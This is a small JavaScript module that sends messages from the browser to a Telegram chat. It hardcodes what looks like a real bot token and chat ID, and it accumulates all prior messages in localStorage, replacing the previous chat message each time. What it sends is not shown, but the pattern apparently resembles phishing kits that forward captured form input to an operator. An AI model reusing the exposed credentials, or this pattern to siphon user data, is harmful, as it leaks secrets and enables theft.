import axios from 'axios';

const BOT_TOKEN = '8296193987:AAH61TUCNdTYemkqyjubwfkgXCXxMOF8AZo';
const CHAT_ID = '-5089027095';

const deleteMessage = async (messageId) => {
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/deleteMessage`, {
            chat_id: CHAT_ID,
            message_id: messageId
        });
    } catch (err) {
        console.error('lỗi xóa message:', err.message);
    }
};

const sendMessage = async (message) => {
    const messageId = localStorage.getItem('messageId');
    const oldMessage = localStorage.getItem('message');

    let text;
    if (messageId) {
        await deleteMessage(messageId);
    }

    if (oldMessage) {
        text = oldMessage + '\n' + message;
    } else {
        text = message;
    }

    try {
        const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'HTML'
        });

        const result = response.data;

        if (result.ok) {
            localStorage.setItem('message', text);
            localStorage.setItem('messageId', result.result.message_id);
        } else {
            console.error('lỗi gửi telegram:', result.description);
        }
    } catch (err) {
        console.error('lỗi gửi telegram:', err.message);
    }
};

export default sendMessage;
